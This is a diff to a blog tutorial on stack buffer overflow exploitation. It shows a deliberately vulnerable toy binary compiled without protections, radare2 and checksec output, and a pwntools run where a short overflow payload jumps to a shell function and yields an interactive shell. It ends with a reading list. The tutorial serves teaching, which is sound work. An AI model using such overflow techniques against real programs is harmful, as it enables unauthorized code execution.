@@ -291,7 +291,69 @@ Let's modify our code a bit to make it easier to exploit. We'll add a function t
 gcc -fno-stack-protector -no-pie -z execstack -o baby baby.c
 ```
 
+We indeed see that our shell function's `execve` and `/bin/sh` are present in the binary:
+
+```ansi
+[33m[0x7f9517f19a50]> [39mfs imports; f
+0x00401030 6 sym.imp.printf
+0x00401040 6 sym.imp.execve
+0x00401050 6 sym.imp.gets
+[33m[0x7f9517f19a50]> [39mrabin2 -z baby
+[Strings]
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00002004 0x00402004 7   8    .rodata ascii /bin/sh
+1   0x0000200c 0x0040200c 17  18   .rodata ascii Enter some text:
+2   0x0000201e 0x0040201e 16  17   .rodata ascii You entered: %s\n
+```
+
+To make our life easier, we'll use `pwntools` to interact with the program. 
+
+```py, copy, name=baby.py, include=files/baby.py
+```
+
+```bash, copy
+python3 baby.py
+```
+
+```ansi
+[(B[0;1m[34m*(B[0m] '/home/cstef/code/blog.cstef.dev/content/posts/canary/files/baby'
+    Arch:       amd64-64-little
+    RELRO:      [33mPartial RELRO
+[39m    Stack:      [31mNo canary found
+[39m    NX:         [33mNX unknown - GNU_STACK missing
+[39m    PIE:        [31mNo PIE (0x400000)
+[39m    Stack:      [31mExecutable
+[39m    RWX:        [31mHas RWX segments
+[39m    Stripped:   [31mNo
+[39m[(B[0;1m[32m+(B[0m] Starting local process './baby': pid 1055
+[(B[0;1m[34m*(B[0m] Switching to interactive mode
+Enter some text: You entered: AAAAAAAAAAAAAAAAAAAAAAAAF\x11@
+(B[0;1m[31m$(B[0m whoami
+cstef
+```
+
+The first `16 * 'A'` are to fill the buffer, and the `F\x11@` is the address of the `shell` function in little-endian.
+
+ezpz, nothing too fancy.
 
 ### Return-Oriented Programming
-
 ## Canary Roasting
+
+## References and Further Reading
+
+- **Offensive Security - Binary Exploitation**  
+    Red Team Notes  
+    [www.ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation)
+
+- **Smashing The Stack For Fun And Profit**  
+    Aleph One  
+    [www-inst.eecs.berkeley.edu](https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf) <small>[PDF]</small>
+
+- **Tut06: Return-oriented Programming (ROP)**  
+    CS6265: Information Security Labra
+    [tc.gts3.org](https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html)
+
+- **Return-Oriented Programming: Systems, Languages, and Applications**  
+    Erik Buchanan, Ryan Roemer, Hovav Shacham, Stefan Savage  
+    [hovav.net](https://hovav.net/ucsd/dist/rop.pdf) <small>[PDF]</small>
